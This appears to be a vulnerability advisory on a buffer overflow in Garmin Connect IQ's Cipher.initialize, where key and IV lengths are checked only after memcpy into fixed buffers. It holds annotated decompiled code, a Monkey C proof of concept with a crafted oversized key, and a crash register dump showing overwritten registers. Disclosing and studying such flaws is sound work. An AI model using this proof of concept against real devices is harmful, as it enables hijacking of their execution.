# Buffer Overflows in `Toybox.Cryptography.Cipher.initialize`
The `Cipher` class supports various parameters when being instantiated, including:

- `key`, a byte array representing the key
- `iv`, a byte array representing the initialization vector

(See: [Garmin - Class: Toybox.Cryptography.Cipher](https://developer.garmin.com/connect-iq/api-docs/Toybox/Cryptography/Cipher.html#initialize-instance_function))

The native function implementing the `initialize` method does not properly check the size of the `key` and `iv` parameters, before copying their value to static-sized buffers:

- The `key` parameter is copied to a static buffer on the stack.
- The `iv` parameter is copied to a static buffer inside an object on the heap.

As a result, it is possible to override the stack, including the program counter (PC) register. This can be abused to hijack the execution on the device and execute arbitrary code.

The root cause of the issue is due to calling `memcpy` and checking the size only **after** the copy was performed:

```c
e_tvm_error native:Toybox.Cryptography.Cipher.initialize(s_tvm_ctx *ctx,uint nb_args)
{
// [...]
      eVar1 = tvm_object_get_bytearray_data(ctx,(s_tvm_object *)key,&bytearray_data);
      psVar2 = (s_tvm_ctx *)(uint)eVar1;
      if (psVar2 != (s_tvm_ctx *)0x0) goto LAB_0478fd0c;
      key_data_length = *(ushort *)&bytearray_data->length;
      // Anvil: Copying the whole key byte array to the static buffer on the stack
      memcpy(static_key_buffer,bytearray_data + 1,(uint)key_data_length);
// [...]
                    /* CIPHER_AES128 */
      if (*(int *)(local_78 + 0x18) == 0) {
        expected_key_size = 0x10;
      }
      else {
                    /* CIPHER_AES256 */
        if (*(int *)(local_78 + 0x18) == 1) {
                    /* error */
          expected_key_size = 0x20;
        }
        else {
          expected_key_size = FUN_0478f594();
        }
      }
      // Anvil: After copying, checking that the key size is either 16 or 32 bytes
      if (((key_data_length != expected_key_size) && (psVar2 = (s_tvm_ctx *)thunk_FUN_00179a5c(ctx,(uint *)object_InvalidOptionsException,PTR_s_Invalid_length_of_:key_for_reque_047900d0), psVar2 != (s_tvm_ctx *)0x0)) ||
         (psVar2 = (s_tvm_ctx *)FUN_0479a198(ctx,&options,symbol_iv,iv), psVar2 != (s_tvm_ctx *)0x0)) goto LAB_0478fd1a;
// [...]
      iv_length = bytearray_data->length;
      *(short *)(local_78 + 0x16) = (short)iv_length;
      // Anvil: Copying the whole IV byte array to static buffer inside an object on the heap
      memcpy(local_78 + 6,bytearray_data + 1,iv_length & 0xffff);
// [...]
      // Anvil: After copying, checking that the IV size is 16 bytes
      if (*(short *)(local_78 + 0x16) != 0x10) {
        if (psVar2 != (s_tvm_ctx *)0x0) goto LAB_0478fc06;
        psVar2 = (s_tvm_ctx *)thunk_FUN_00179a5c(ctx,(uint *)object_InvalidOptionsException,PTR_s_Invalid_length_of_:iv_for_reques_047900dc);
      }
// [...]
```

The crash can be triggered with the following proof-of-concept:

```java
var keyConvertOptions = {
    :fromRepresentation => StringUtil.REPRESENTATION_STRING_HEX,
    :toRepresentation => StringUtil.REPRESENTATION_BYTE_ARRAY
};
var keyBytes = StringUtil.convertEncodedString(
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbccccccccddddddddeeeeeeeeffffffff11111111bbbbbbbbccccccccdddddddd",
    keyConvertOptions
);
var ivBytes = StringUtil.convertEncodedString(
    "aaaaaaaaaaaaaaaabbbbbbbbbbbbbbbb",
    keyConvertOptions
);

var myCipher = new Crypto.Cipher({
    :algorithm => Crypto.CIPHER_AES128,
    :mode => Crypto.MODE_ECB,
    :key => keyBytes,
    :iv => ivBytes
});
```

Register values when the crash occurs (note that they are off-by-one, meaning that `r16` is actually `r15`):

```
r0: 0x20004688
r1: 0x00000016
r2: 0x001bffff
r3: 0x00000001
r4: 0x00000015
r5: 0xdddddddd
r6: 0xeeeeeeee
r7: 0xffffffff
r8: 0xaaaaaaaa
r9: 0xbbbbbbbb
r10: 0xcccccccc
r11: 0x40020091
r12: 0x00000016
r13: 0x00000000
r14: 0x20004158
r15: 0x00000000
r16: 0xdddddddc
r17: 0x210f0000
r18: 0x40000000
r19: 0x00000001
r20: 0xe000ed38
r21: 0xe000ed34
r22: 0x00000000
```

The proof-of-concept application can be found here: <https://github.com/anvilsecure/garmin-ciq-app-research/blob/main/poc/GRMN-10.prg>